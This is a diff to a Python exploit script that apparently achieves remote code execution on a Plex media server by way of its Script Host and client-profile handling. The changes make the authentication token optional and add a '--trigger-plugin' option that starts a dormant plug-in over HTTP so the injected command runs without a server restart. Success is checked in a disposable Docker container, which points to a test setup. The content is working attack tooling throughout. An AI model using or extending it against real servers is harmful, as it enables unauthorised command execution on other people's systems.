@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import pathlib
+import re
 import subprocess
 import sys
 import time
@@ -75,10 +76,14 @@ def parse_args():
     )
     parser.add_argument("--url", required=True, help="Plex server origin")
     parser.add_argument("--rating-key", required=True, type=int)
-    parser.add_argument("--token", required=True, help="Plex authentication token")
+    parser.add_argument("--token", help="Plex authentication token")
     parser.add_argument("--command", required=True, help="Command executed by Script Host")
     parser.add_argument("--container", help="Disposable Docker container to restart")
     parser.add_argument("--verify-path", help="Container path the command should create")
+    parser.add_argument(
+        "--trigger-plugin",
+        help="start this dormant Framework plug-in over HTTP instead of restarting the container",
+    )
     parser.add_argument(
         "--keep-payload",
         action="store_true",
@@ -99,6 +104,10 @@ def parse_args():
         parser.error("--container requires --verify-path for execution verification")
     if args.keep_payload and not args.container:
         parser.error("--keep-payload requires --container")
+    if args.trigger_plugin and not args.container:
+        parser.error("--trigger-plugin requires --container for execution verification")
+    if args.trigger_plugin and not re.fullmatch(r"[A-Za-z0-9._-]+", args.trigger_plugin):
+        parser.error("--trigger-plugin contains an invalid character")
     args.url = args.url.rstrip("/")
     return args
 
@@ -133,7 +142,6 @@ def main():
     session = f"profile-rce-{stamp}"
     client = f"profile-rce-client-{stamp}"
     headers = {
-        "X-Plex-Token": args.token,
         "X-Plex-Client-Identifier": client,
         "X-Plex-Session-Identifier": client,
         "X-Plex-Client-Profile-Name": "Web",
@@ -143,6 +151,8 @@ def main():
         "X-Plex-Platform": "Chrome",
         "X-Plex-Device": "Linux",
     }
+    if args.token:
+        headers["X-Plex-Token"] = args.token
     params = {
         "path": f"/library/metadata/{args.rating_key}",
         "mediaIndex": 0,
@@ -202,6 +212,21 @@ def main():
     try:
         if docker_path_exists(args.container, args.verify_path):
             print("[4/4] Command executed before the explicit restart")
+        elif args.trigger_plugin:
+            print("[4/4] Start dormant Script Host over HTTP and verify execution")
+            trigger_headers = {}
+            if args.token:
+                trigger_headers["X-Plex-Token"] = args.token
+            try:
+                http_get(
+                    f"{args.url}/:/plugins/{args.trigger_plugin}",
+                    headers=trigger_headers,
+                )
+                print("Script Host trigger status: 200")
+            except RuntimeError as exc:
+                # Plug-in startup occurs before application-route resolution;
+                # a dormant agent commonly starts and then returns 404.
+                print(f"Script Host trigger response: {exc}")
         else:
             print("[4/4] Restart container and verify execution")
             subprocess.run(
